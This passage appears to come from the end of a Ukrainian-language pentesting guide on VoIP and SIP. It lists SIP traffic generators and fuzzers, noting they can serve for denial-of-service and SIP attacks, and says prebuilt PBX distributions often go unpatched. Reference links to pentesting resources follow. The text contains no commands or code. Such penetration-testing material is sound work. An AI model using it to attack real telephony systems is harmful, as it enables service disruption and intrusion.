- [**SIPp**](https://github.com/SIPp/sipp): Дозволяє аналізувати та генерувати SIP трафік, тому його також можна використовувати для DoS.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP швейцарський армійський ніж. Також може бути використаний для виконання SIP атак.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Уразливості ОС

Найпростіший спосіб встановити програмне забезпечення, таке як Asterisk, - це завантажити **дистрибутив ОС**, який вже має його встановленим, наприклад: **FreePBX, Elastix, Trixbox**... Проблема з цими дистрибутивами полягає в тому, що, як тільки вони починають працювати, системні адміністратори можуть **більше не оновлювати їх**, і **вразливості** будуть виявлені з часом.

## Посилання

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
